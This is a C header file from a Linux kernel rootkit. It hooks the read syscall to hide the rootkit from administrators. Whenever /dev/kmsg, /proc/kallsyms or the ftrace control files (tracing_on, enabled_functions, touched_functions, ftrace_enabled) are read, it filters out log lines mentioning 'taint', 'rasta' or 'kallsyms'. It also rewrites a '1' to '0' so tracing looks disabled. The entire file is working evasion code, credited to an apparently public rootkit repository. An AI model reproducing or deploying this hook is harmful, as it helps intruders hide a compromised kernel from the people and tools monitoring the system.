/*
        Big Collab with MatheuZSecurity on this https://github.com/matheuZSecurity/Rootkit/Ring0/clear-taint-dmesg
*/

#ifndef READ_H
#define READ_H

#define B_F 4096  // Temporary buffer size for reading

static asmlinkage ssize_t (*og_read)(const struct pt_regs *regs); // Pointer to the original read function

static asmlinkage ssize_t hooked_read(const struct pt_regs *regs);

// Hooked function that intercepts the syscall read
static notrace asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
    int fd = regs->di; // First argument of read: fd
    char __user *user_buf = (char __user *)regs->si; // Second argument: output buffer for user
    char *kernel_buf;
    ssize_t bytes_read;
    struct file *file;

    static int spoof_next_read = 0; // Used to spoof one read

    // Check if the fd is from /dev/kmsg, /proc/kallsyms or /sys/kernel/tracing/touched_functions
    file = fget(fd); // Gets the file object corresponding to the fd
    if (file) {
	    
      /* Check if the file is:
	       	- /dev/kmsg 
	        - /proc/kallsyms
      	 	- /sys/kernel/tracing/enabled_functions
      	 	- /sys/kernel/tracing/touched_functions
      	 	- /sys/kernel/tracing/tracing_on
      	 	- /proc/sys/kernel/ftrace_enabled */
	
	
        if (strcmp(file->f_path.dentry->d_name.name, "kmsg") == 0 ||
            strcmp(file->f_path.dentry->d_name.name, "kallsyms") == 0 ||
            strcmp(file->f_path.dentry->d_name.name, "touched_functions") == 0 ||
	          strcmp(file->f_path.dentry->d_name.name, "ftrace_enabled") == 0 ||
	          strcmp(file->f_path.dentry->d_name.name, "tracing_on") == 0 ||
	          strcmp(file->f_path.dentry->d_name.name, "enabled_functions") == 0) {
            
            fput(file); // Frees the file object after verification

            // Allocates a temporary buffer in kernel space
            kernel_buf = kmalloc(B_F, GFP_KERNEL);
            if (!kernel_buf) {
                printk(KERN_ERR "Failed to allocate temporary buffer.\n");
                return -ENOMEM;
            }

            // Calls the original function to read data from the file
            bytes_read = og_read(regs);
            if (bytes_read < 0) {
                kfree(kernel_buf);
                return bytes_read;
            }

            // Copies data read from user space to the buffer in the kernel for processing
            if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
                kfree(kernel_buf);
                return -EFAULT;
            }

	    // If the current val is "1" we need to spoof it, change it to "0" once. If not the zeros are so bad bro ...
            if (spoof_next_read == 0 && strncmp(kernel_buf, "1", 1) == 0) {
                kernel_buf[0] = '0';
                spoof_next_read = 1; // Ensure spoof happens only once
            } else {
                spoof_next_read = 0; // Reset spoof
            }

            // Filter out lines that contain the words "taint", "rasta", or "kallsyms"
            char *filtered_buf = kzalloc(B_F, GFP_KERNEL); // Buffer for filtered messages
            if (!filtered_buf) {
                kfree(kernel_buf);
                return -ENOMEM;
            }

            char *line, *line_ptr;
            size_t filtered_len = 0;

            // Process the kernel buffer, line by line
            line = kernel_buf;
            while ((line_ptr = strchr(line, '\n'))) {
                *line_ptr = '\0';  // Temporarily terminate the line

            /*
                So check it out, this is where the magic happens with hiding from those tracing files. 
            */

                // Check if the line contains "taint", "rasta", or "kallsyms" 
                if (!strstr(line, "taint") && !strstr(line, "rasta") && !strstr(line, "kallsyms")) {
                    size_t line_len = strlen(line);
                    if (filtered_len + line_len + 1 < B_F) {  // Check for space in the filtered buffer
                        strcpy(filtered_buf + filtered_len, line);  // Append the line
                        filtered_len += line_len;
                        filtered_buf[filtered_len++] = '\n';  // Add newline after the line
                    }
                }

                line = line_ptr + 1;  // Move to the next line
            }

            // Ensures the final buffer is null-terminated
            filtered_buf[filtered_len] = '\0';

            // Copy the filtered buffer back to userspace
            if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
                kfree(kernel_buf);
                kfree(filtered_buf);
                return -EFAULT;
            }

            kfree(kernel_buf);
            kfree(filtered_buf);
            return filtered_len;
        }

        fput(file); // Frees the file object if it's neither /dev/kmsg /proc/kallsyms, nor /sys/kernel/tracing/touched_functions
    }

    return og_read(regs); // Calls the original reading function if it's not /dev/kmsg, /proc/kallsyms or /sys/kernel/tracing/touched_functions
}

#endif
